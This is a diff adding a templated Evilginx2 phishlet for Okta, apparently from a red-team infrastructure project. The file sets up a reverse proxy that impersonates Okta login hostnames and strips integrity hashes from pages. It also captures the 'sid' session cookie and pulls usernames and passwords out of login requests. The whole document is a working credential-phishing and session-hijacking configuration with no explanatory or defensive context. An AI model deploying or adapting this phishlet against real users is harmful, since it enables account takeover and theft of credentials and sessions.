@@ -1,0 +1,26 @@
+{% for vm in warhorse.vm|selectattr("evilginx2", "defined" ) %}
+name: 'okta'
+author: '@mikesiegel'
+min_ver: '2.3.0'
+proxy_hosts:
+  - {phish_sub: '{{ vm.evilginx2.okta.login_hostname }}', orig_sub: 'login', domain: 'okta.com', session: false, is_landing: false}
+  - {phish_sub: '', orig_sub: '', domain: 'okta.com', session: false, is_landing: false }
+  - {phish_sub: '{{ vm.evilginx2.okta.hostname }}', orig_sub: '{{ vm.evilginx2.okta.hostname }}', domain: 'okta.com', session: true, is_landing: true}
+sub_filters:
+  - {triggers_on: '{{ vm.evilginx2.okta.hostname }}.okta.com', orig_sub: '', domain: '{{ vm.evilginx2.okta.hostname }}.okta.com', search: 'sha384-.{64}', replace: '', mimes: ['text/html']}
+auth_tokens:
+  - domain: '{{ vm.evilginx2.okta.hostname }}.okta.com'
+    keys: ['sid']
+credentials:
+  username:
+    key: ''
+    search: '"username":"([^"]*)'
+    type: 'json'
+  password:
+    key: ''
+    search: '"password":"([^"]*)'
+    type: 'json'
+login:
+  domain: '{{ vm.evilginx2.okta.hostname }}.okta.com'
+  path: '/login/login.htm'
+{% endfor %}
